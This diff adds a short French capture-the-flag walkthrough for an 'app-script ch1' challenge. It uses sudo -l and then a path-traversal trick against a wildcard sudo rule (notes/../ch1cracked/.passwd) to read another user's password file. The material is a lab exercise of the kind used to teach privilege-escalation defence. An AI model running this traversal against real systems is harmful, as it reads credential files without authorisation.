@@ -1,0 +1,10 @@
+# En faisant sudo -l, nous pouvons voir la ou les commandes autorisées sur le ou les dossiers.
+app-script-ch01@challenge02:/ch1cracked$ sudo -l
+
+# aller voir ce que l'on peut voir, nous pouvons lire le fichier à l'aide de la cat
+app-script-ch1@challenge02:/$ sudo -u app-script-ch1-cracked cat /challenge/app-script/ch1/notes/*
+
+# Nous allons dans ce cas réaliser un cat en prenant le chemin et en intégrant un retour arriere puis en faisant suivre le chemin auquel on veut accéder
+app-script-ch1@challenge02:/$ sudo -u app-script-ch1-cracked cat /challenge/app-script/ch1/notes/../ch1cracked/.passwd
+
+Le mot de passe s'affichera ensuite.
